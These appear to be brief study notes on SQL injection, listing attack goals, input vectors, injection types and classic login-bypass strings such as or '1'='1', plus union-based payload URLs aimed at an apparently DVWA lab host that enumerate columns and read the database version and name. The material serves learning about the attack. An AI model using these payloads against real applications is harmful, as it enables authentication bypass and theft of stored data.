**SQL queries often involve untrusted data:**

* App is responsible for interpolating user data into queries.
* Insufficient sanitization could lead to modification of query syntax.



**Possible attacks:**

1. Confidentiality: modify queries to get unauthorized data. eg. passwords, private user content

2\. Integrity: modify queries to perform unauthorized updates. eg. passwords, admin status

3\. Authentication: modify query to bypass authentication checks. eg. password checks



**Attackers Input field:** POSTed forms, URL parameters, Cookie values, HTTP request headers.



***Login Queries :***

1. where user="username" and password="xyz" or "1"="1";

2\. where user="username" and password="xyz" or password="123";'

3\. where user="username" and password="" or 1=1; --";'

4\. where user="username"; --" and password"";'



***Types of SQL injection:***

1. In-band/classic: Retrieved data presented directly in application webpage. 

&#x09;Sub-Types: I) Error II) Union

1. Interferential/Blind: I) Time II) Boolean
2. Out-of-band



***Error \& Union based SQL injection:***

http://20.251.155.53:8080/vulnerabilities/sqli/?id=' order by 1,2,3,4,5,6 -- -\&Submit=Submit#

http://20.251.155.53:8080/vulnerabilities/sqli/?id=' order by 1,2 -- -\&Submit=Submit#

http://20.251.155.53:8080/vulnerabilities/sqli/?id=' union select 1,2 -- -\&Submit=Submit#

http://20.251.155.53:8080/vulnerabilities/sqli/?id=' union select version(),2 -- -\&Submit=Submit#

http://20.251.155.53:8080/vulnerabilities/sqli/?id=' union select database(),2 -- -\&Submit=Submit#



